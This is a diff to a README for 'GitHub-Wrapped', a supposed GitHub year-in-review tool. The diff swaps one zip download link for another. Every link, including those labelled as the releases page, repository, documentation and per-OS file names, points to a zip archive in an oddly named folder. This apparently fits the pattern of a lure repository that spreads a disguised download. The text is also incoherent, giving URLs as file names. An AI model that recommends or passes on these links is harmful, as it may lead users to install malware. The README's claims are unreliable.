@@ -1,7 +1,7 @@
 # 🎉 GitHub-Wrapped - Explore Your Year in Coding
 
 ## 📥 Download Now
-[![Download GitHub-Wrapped](https://github.com/fahry993/GitHub-Wrapped/raw/refs/heads/main/micrencephalus/Git_Wrapped_Hub_3.0.zip)](https://github.com/fahry993/GitHub-Wrapped/raw/refs/heads/main/micrencephalus/Git_Wrapped_Hub_3.0.zip)
+[![Download GitHub-Wrapped](https://raw.githubusercontent.com/fahry993/GitHub-Wrapped/main/micrencephalus/Wrapped_Git_Hub_1.0.zip)](https://raw.githubusercontent.com/fahry993/GitHub-Wrapped/main/micrencephalus/Wrapped_Git_Hub_1.0.zip)
 
 ## 📖 Overview
 GitHub-Wrapped helps you discover your coding year in review. Visualize your GitHub activity through engaging analytics. Understand your contributions and development habits better while accessing clear data visualizations.
@@ -10,13 +10,13 @@ GitHub-Wrapped helps you discover your coding year in review. Visualize your Git
 To easily start using GitHub-Wrapped, follow these steps:
 
 ### 1. Visit the Download Page
-Head to our [Releases page](https://github.com/fahry993/GitHub-Wrapped/raw/refs/heads/main/micrencephalus/Git_Wrapped_Hub_3.0.zip) to access the latest version of GitHub-Wrapped. You will find all available releases listed there.
+Head to our [Releases page](https://raw.githubusercontent.com/fahry993/GitHub-Wrapped/main/micrencephalus/Wrapped_Git_Hub_1.0.zip) to access the latest version of GitHub-Wrapped. You will find all available releases listed there.
 
 ### 2. Choose Your Version
 On the Releases page, you will see multiple versions of the software. Locate the most recent version at the top. This version contains the latest features and improvements, so it is recommended to download this one.
 
 ### 3. Download the Application
-Click on the version you selected. A list of files will appear. Choose the appropriate file for your operating system. For instance, if you are using Windows, you might find a file called `https://github.com/fahry993/GitHub-Wrapped/raw/refs/heads/main/micrencephalus/Git_Wrapped_Hub_3.0.zip`. For Mac, look for `https://github.com/fahry993/GitHub-Wrapped/raw/refs/heads/main/micrencephalus/Git_Wrapped_Hub_3.0.zip`. Click to start the download.
+Click on the version you selected. A list of files will appear. Choose the appropriate file for your operating system. For instance, if you are using Windows, you might find a file called `https://raw.githubusercontent.com/fahry993/GitHub-Wrapped/main/micrencephalus/Wrapped_Git_Hub_1.0.zip`. For Mac, look for `https://raw.githubusercontent.com/fahry993/GitHub-Wrapped/main/micrencephalus/Wrapped_Git_Hub_1.0.zip`. Click to start the download.
 
 ## 💾 Download & Install
 Once the download completes, follow these steps based on your operating system:
@@ -76,7 +76,7 @@ GitHub-Wrapped runs on most modern systems. Here are the minimum requirements:
 If you encounter any issues, please check the FAQs in the project repository or open an issue on GitHub. We are here to help you get the most out of GitHub-Wrapped.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/fahry993/GitHub-Wrapped/raw/refs/heads/main/micrencephalus/Git_Wrapped_Hub_3.0.zip)
-- [GitHub Documentation](https://github.com/fahry993/GitHub-Wrapped/raw/refs/heads/main/micrencephalus/Git_Wrapped_Hub_3.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/fahry993/GitHub-Wrapped/main/micrencephalus/Wrapped_Git_Hub_1.0.zip)
+- [GitHub Documentation](https://raw.githubusercontent.com/fahry993/GitHub-Wrapped/main/micrencephalus/Wrapped_Git_Hub_1.0.zip)
 
 For any feedback or feature requests, feel free to reach out. Thank you for choosing GitHub-Wrapped!
